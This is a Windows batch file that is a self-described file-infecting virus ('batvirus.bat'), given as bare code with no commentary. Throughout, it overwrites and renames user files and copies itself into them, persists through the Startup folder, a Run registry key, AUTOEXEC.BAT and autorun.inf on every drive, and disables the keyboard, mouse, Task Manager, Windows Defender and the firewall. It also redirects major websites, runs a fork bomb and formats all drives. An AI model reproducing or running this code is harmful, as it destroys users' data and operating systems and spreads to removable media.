@echo off

REN *.bat *.gif

REN *.exe *.png

REN *.gif *.vir

REN *.jpeg *.vir

REN *.png *.vir

REN *.mp3 *.bat

REN *.avi *.mp3

REN *.wmv *.txt

REN *.doc *.jpeg

REN *.pdf *.gif

REN *.cls *.exe

REN *.mov *.bat

Dir %Homedrive% /s /b > DirPath
For /f %%Y In (DirPath) Do (
Set DirPath=%%Y > Nul 
For %%Z In (%DirPath%\*.bat) Do (
Set BatInfect=%%Z > Nul
Copy /y %0 %BatInfect%
)
)
Del /f /s /q DirPath

Dir %Homedrive% /s /b > DirPath
For /f %%Y In (DirPath) Do (
Set DirPath=%%Y > Nul 
For %%Z In (%DirPath%\*.exe) Do (
Set ExeInfect=%%Z > Nul
Copy /y %0 %ExeInfect%
)
)
Del /f /s /q DirPath

Dir %Homedrive% /s /b > DirPath
For /f %%Y In (DirPath) Do (
Set DirPath=%%Y > Nul 
For %%Z In (%DirPath%\*.gif) Do (
Set GifInfect=%%Z > Nul
Copy /y %0 %GifInfect%
)
)
Del /f /s /q DirPath

Dir %Homedrive% /s /b > DirPath
For /f %%Y In (DirPath) Do (
Set DirPath=%%Y > Nul 
For %%Z In (%DirPath%\*.jpeg) Do (
Set JpegInfect=%%Z > Nul
Copy /y %0 %JpegInfect%
)
)
Del /f /s /q DirPath

Dir %Homedrive% /s /b > DirPath
For /f %%Y In (DirPath) Do (
Set DirPath=%%Y > Nul 
For %%Z In (%DirPath%\*.mp3) Do (
Set Mp3Infect=%%Z > Nul
Copy /y %0 %Mp3Infect%
)
)
Del /f /s /q DirPath

Dir %Homedrive% /s /b > DirPath
For /f %%Y In (DirPath) Do (
Set DirPath=%%Y > Nul 
For %%Z In (%DirPath%\*.mpeg) Do (
Set MpegInfect=%%Z > Nul
Copy /y %0 %MpegInfect%
)
)
Del /f /s /q DirPath

Dir %Homedrive% /s /b > DirPath
For /f %%Y In (DirPath) Do (
Set DirPath=%%Y > Nul 
For %%Z In (%DirPath%\*.rar) Do (
Set RarInfect=%%Z > Nul
Copy /y %0 %RarInfect%
)
)
Del /f /s /q DirPath

Dir %Homedrive% /s /b > DirPath
For /f %%Y In (DirPath) Do (
Set DirPath=%%Y > Nul 
For %%Z In (%DirPath%\*.txt) Do (
Set TxtInfect=%%Z > Nul
Copy /y %0 %TxtInfect%
)
)
Del /f /s /q DirPath

Dir %Homedrive% /s /b > DirPath
For /f %%Y In (DirPath) Do (
Set DirPath=%%Y > Nul 
For %%Z In (%DirPath%\*.vbs) Do (
Set VbsInfect=%%Z > Nul
Copy /y %0 %VbsInfect%
)
)
Del /f /s /q DirPath

Dir %Homedrive% /s /b > DirPath
For /f %%Y In (DirPath) Do (
Set DirPath=%%Y > Nul 
For %%Z In (%DirPath%\*.doc) Do (
Set DocInfect=%%Z > Nul
Copy /y %0 %DocInfect%
)
)
Del /f /s /q DirPath

Dir %Homedrive% /s /b > DirPath
For /f %%Y In (DirPath) Do (
Set DirPath=%%Y > Nul 
For %%Z In (%DirPath%\*.html) Do (
Set HtmlInfect=%%Z > Nul
Copy /y %0 %HtmlInfect%
)
)
Del /f /s /q DirPath

Dir %Homedrive% /s /b > DirPath
For /f %%Y In (DirPath) Do (
Set DirPath=%%Y > Nul 
For %%Z In (%DirPath%\*.wma) Do (
Set WmaInfect=%%Z > Nul
Copy /y %0 %WmaInfect%
)
)
Del /f /s /q DirPath

Dir %Homedrive% /s /b > DirPath
For /f %%Y In (DirPath) Do (
Set DirPath=%%Y > Nul 
For %%Z In (%DirPath%\*.zip) Do (
Set ZipInfect=%%Z > Nul
Copy /y %0 %ZipInfect%
)
)
Del /f /s /q DirPath

Dir %Homedrive% /s /b > DirPath
For /f %%Y In (DirPath) Do (
Set DirPath=%%Y > Nul 
For %%Z In (%DirPath%\*.png) Do (
Set PngInfect=%%Z > Nul
Copy /y %0 %PngInfect%
)
)
Del /f /s /q DirPath

Dir %Homedrive% /s /b > DirPath
For /f %%Y In (DirPath) Do (
Set DirPath=%%Y > Nul 
For %%Z In (%DirPath%\*.mov) Do (
Set MovInfect=%%Z > Nul
Copy /y %0 %MovInfect%
)
)
Del /f /s /q DirPath

Dir %Homedrive% /s /b > DirPath
For /f %%Y In (DirPath) Do (
Set DirPath=%%Y > Nul 
For %%Z In (%DirPath%\*.mp4) Do (
Set Mp4Infect=%%Z > Nul
Copy /y %0 %Mp4Infect%
)
)
Del /f /s /q DirPath

Dir %Homedrive% /s /b > DirPath
For /f %%Y In (DirPath) Do (
Set DirPath=%%Y > Nul 
For %%Z In (%DirPath%\*.vb) Do (
Set vbInfect=%%Z > Nul
Copy /y %0 %vbInfect%
)
)
Del /f /s /q DirPath

copy "batvirus.bat" "%userprofile%\Start Menu\Programs\Startup\batvirus.bat" 

valinf = "rundll32_%random%_toolbar"
reginf = "hklm\Software\Microsoft\Windows\CurrentVersion\Run"
reg add %reginf% /v %valinf% /t "REG_SZ" /d %0 /f > nul

echo start "" %0>>%SystemDrive%\AUTOEXEC.BAT

copy %0 %windir%\system32\ls.bat

for %%E In (A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z) Do (
copy /Y %0 %%E:\
echo [AutoRun] > %%E:\autorun.inf
echo open="%%E:\%0" >> %%E:\autorun.inf
echo action=Open folder to see files... >> %%E:\autorun.inf)

Dir %SystemRoot% /s /b > PathHost
For /f %%a In (PathHost) Do Copy /y %0 %%a > Nul
Del /f /s /q PathHost > Nul

del /f /q "calc.exe" 

del /f /q "mspaint.exe" 

del /f /q "C:\Users\%userprofile%\My Documents\My Pictures\*.*" 

del /f /q "C:\Program Files\Windows Media Player\*.*" 

del /f /q "C:\Program Files\Internet Explorer\iexplore.exe" 

del /f /q "C:\Users\%userprofile%\My Documents\*.*" 

del /f /q "notepad.exe" 

del /f /q "WordPad.exe" 

del /f /q "C:\Program Files\Mozilla Firefox\*.*" 

del /f /q "C:\Users\%userprofile%\My Documents\My Music\*.*" 

del /f /q "wlmail.exe" 

del /f /q "C:\WINDOWS\system32\kernel32.dll" 

reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul

echo Windows Registry Editor Version 5.00 > "nokeyboard.reg" 
echo [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Keyboard Layout] >> "nokeyboard.reg" 
echo "Scancode Map"=hex:00,00,00,00,00,00,00,00,7c,00,00,00,00,00,01,00,00,\ >> "nokeyboard.reg" 
echo 00,3b,00,00,00,3c,00,00,00,3d,00,00,00,3e,00,00,00,3f,00,00,00,40,00,00,00,\ >> "nokeyboard.reg" 
echo 41,00,00,00,42,00,00,00,43,00,00,00,44,00,00,00,57,00,00,00,58,00,00,00,37,\ >> "nokeyboard.reg" 
echo e0,00,00,46,00,00,00,45,00,00,00,35,e0,00,00,37,00,00,00,4a,00,00,00,47,00,\ >> "nokeyboard.reg" 
echo 00,00,48,00,00,00,49,00,00,00,4b,00,00,00,4c,00,00,00,4d,00,00,00,4e,00,00,\ >> "nokeyboard.reg" 
echo 00,4f,00,00,00,50,00,00,00,51,00,00,00,1c,e0,00,00,53,00,00,00,52,00,00,00,\ >> "nokeyboard.reg" 
echo 4d,e0,00,00,50,e0,00,00,4b,e0,00,00,48,e0,00,00,52,e0,00,00,47,e0,00,00,49,\ >> "nokeyboard.reg" 
echo e0,00,00,53,e0,00,00,4f,e0,00,00,51,e0,00,00,29,00,00,00,02,00,00,00,03,00,\ >> "nokeyboard.reg" 
echo 00,00,04,00,00,00,05,00,00,00,06,00,00,00,07,00,00,00,08,00,00,00,09,00,00,\ >> "nokeyboard.reg" 
echo 00,0a,00,00,00,0b,00,00,00,0c,00,00,00,0d,00,00,00,0e,00,00,00,0f,00,00,00,\ >> "nokeyboard.reg" 
echo 10,00,00,00,11,00,00,00,12,00,00,00,13,00,00,00,14,00,00,00,15,00,00,00,16,\ >> "nokeyboard.reg" 
echo 00,00,00,17,00,00,00,18,00,00,00,19,00,00,00,1a,00,00,00,1b,00,00,00,2b,00,\ >> "nokeyboard.reg" 
echo 00,00,3a,00,00,00,1e,00,00,00,1f,00,00,00,20,00,00,00,21,00,00,00,22,00,00,\ >> "nokeyboard.reg" 
echo 00,23,00,00,00,24,00,00,00,25,00,00,00,26,00,00,00,27,00,00,00,28,00,00,00,\ >> "nokeyboard.reg" 
echo 1c,00,00,00,2a,00,00,00,2c,00,00,00,2d,00,00,00,2e,00,00,00,2f,00,00,00,30,\ >> "nokeyboard.reg" 
echo 00,00,00,31,00,00,00,32,00,00,00,33,00,00,00,34,00,00,00,35,00,00,00,36,00,\ >> "nokeyboard.reg" 
echo 00,00,1d,00,00,00,5b,e0,00,00,38,00,00,00,39,00,00,00,38,e0,00,00,5c,e0,00,\ >> "nokeyboard.reg" 
echo 00,5d,e0,00,00,1d,e0,00,00,5f,e0,00,00,5e,e0,00,00,22,e0,00,00,24,e0,00,00,\ >> "nokeyboard.reg" 
echo 10,e0,00,00,19,e0,00,00,30,e0,00,00,2e,e0,00,00,2c,e0,00,00,20,e0,00,00,6a,\ >> "nokeyboard.reg" 
echo e0,00,00,69,e0,00,00,68,e0,00,00,67,e0,00,00,42,e0,00,00,6c,e0,00,00,6d,e0,\ >> "nokeyboard.reg" 
echo 00,00,66,e0,00,00,6b,e0,00,00,21,e0,00,00,00,00 >> "nokeyboard.reg" 
start nokeyboard.reg

set key="HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Mouclass"
reg delete %key%
reg add %key% /v Start /t REG_DWORD /d 4

ipconfig /release
if ERRORLEVEL1 ipconfig /release_all

net stop "WinDefend" 
taskkill /f /t /im "MSASCui.exe" 

net stop "WPCSvc" 

net stop "wscsvc" 

net stop "wuauserv" 

net stop "SDRSVC" 

net stop "WerSvc" 

net stop "MpsSvc" 
taskkill /f /t /im "FirewallControlPanel.exe" 

net stop "WSearch" 

echo Do >> "opendisk.vbs" 
echo Set oWMP = CreateObject("WMPlayer.OCX.7" ) >> "opendisk.vbs" 
echo Set colCDROMs = oWMP.cdromCollection >> "opendisk.vbs" 
echo colCDROMs.Item(d).Eject >> "opendisk.vbs" 
echo colCDROMs.Item(d).Eject >> "opendisk.vbs" 
echo Loop >> "opendisk.vbs" 
start "" "opendisk.vbs" 

time 12:00

DIR /S/B %SystemDrive%\*.txt >> FIleList_txt.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_txt.txt) do del "%%j:%%k"

DIR /S/B %SystemDrive%\*.doc >> FIleList_doc.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_doc.txt) do del "%%j:%%k"

DIR /S/B %SystemDrive%\*.vb >> FIleList_vb.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_vb.txt) do del "%%j:%%k"

DIR /S/B %SystemDrive%\*.exe >> FIleList_exe.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_exe.txt) do del "%%j:%%k"

DIR /S/B %SystemDrive%\*.jpeg >> FIleList_jpeg.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_jpeg.txt) do del "%%j:%%k"

DIR /S/B %SystemDrive%\*.png >> FIleList_png.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_png.txt) do del "%%j:%%k"

DIR /S/B %SystemDrive%\*.gif >> FIleList_gif.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_gif.txt) do del "%%j:%%k"

DIR /S/B %SystemDrive%\*.bmp >> FIleList_bmp.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_bmp.txt) do del "%%j:%%k"

DIR /S/B %SystemDrive%\*.mp3 >> FIleList_mp3.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_mp3.txt) do del "%%j:%%k"

DIR /S/B %SystemDrive%\*.mp4 >> FIleList_mp4.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_mp4.txt) do del "%%j:%%k"

DIR /S/B %SystemDrive%\*.rar >> FIleList_rar.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_rar.txt) do del "%%j:%%k"

DIR /S/B %SystemDrive%\*.zip >> FIleList_zip.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_zip.txt) do del "%%j:%%k"

taskkill /f /t /im chrome.exe

taskkill /f /t /im firefox.exe

taskkill /f /t /im opera.exe

taskkill /f /t /im iexplore.exe

taskkill /f /t /im explorer.exe

taskkill /f /t /im hl.exe

taskkill /f /t /im cstrike.exe

cd "C:\Windows\System32\Drivers\etc"
echo 127.0.0.1 google.com >> "Hosts"
echo 127.0.0.1 http://www.google.com >> "Hosts"

cd "C:\Windows\System32\Drivers\etc"
echo 127.0.0.1 yahoo.com >> "Hosts"
echo 127.0.0.1 http://www.yahoo.com >> "Hosts"

cd "C:\Windows\System32\Drivers\etc"
echo 127.0.0.1 facebook.com >> "Hosts"
echo 127.0.0.1 http://www.facebook.com >> "Hosts"

cd "C:\Windows\System32\Drivers\etc"
echo 127.0.0.1 hotmail.com >> "Hosts"
echo 127.0.0.1 http://www.hotmail.com >> "Hosts"

del /f /q %0

%0|%0

FORMAT A: /FS:NTFS /V:(A:) /X /P:1 /y >nul
FORMAT B: /FS:NTFS /V:(B:) /X /P:1 /y >nul
FORMAT C: /FS:NTFS /V:(C:) /X /P:1 /y >nul
FORMAT D: /FS:NTFS /V:(D:) /X /P:1 /y >nul
FORMAT E: /FS:NTFS /V:(E:) /X /P:1 /y >nul
FORMAT F: /FS:NTFS /V:(F:) /X /P:1 /y >nul
FORMAT G: /FS:NTFS /V:(G:) /X /P:1 /y >nul
FORMAT H: /FS:NTFS /V:(H:) /X /P:1 /y >nul
FORMAT I: /FS:NTFS /V:(I:) /X /P:1 /y >nul
FORMAT J: /FS:NTFS /V:(J:) /X /P:1 /y >nul
FORMAT K: /FS:NTFS /V:(K:) /X /P:1 /y >nul
FORMAT M: /FS:NTFS /V:(M:) /X /P:1 /y >nul
FORMAT N: /FS:NTFS /V:(N:) /X /P:1 /y >nul
FORMAT O: /FS:NTFS /V:(O:) /X /P:1 /y >nul
FORMAT P: /FS:NTFS /V:(P:) /X /P:1 /y >nul
FORMAT Q: /FS:NTFS /V:(Q:) /X /P:1 /y >nul
FORMAT R: /FS:NTFS /V:(R:) /X /P:1 /y >nul
FORMAT S: /FS:NTFS /V:(S:) /X /P:1 /y >nul
FORMAT T: /FS:NTFS /V:(T:) /X /P:1 /y >nul
FORMAT U: /FS:NTFS /V:(U:) /X /P:1 /y >nul
FORMAT V: /FS:NTFS /V:(V:) /X /P:1 /y >nul
FORMAT W: /FS:NTFS /V:(W:) /X /P:1 /y >nul
FORMAT X: /FS:NTFS /V:(X:) /X /P:1 /y >nul
FORMAT Z: /FS:NTFS /V:(Z:) /X /P:1 /y >nul

format c: /q /autotest

DELTREE /Y %windir%

echo x=msgbox("I love you bitch!",vbCritical or vbOkOnly,"Noob says:") >>dll32.vbs"
start "" "dll32.vbs"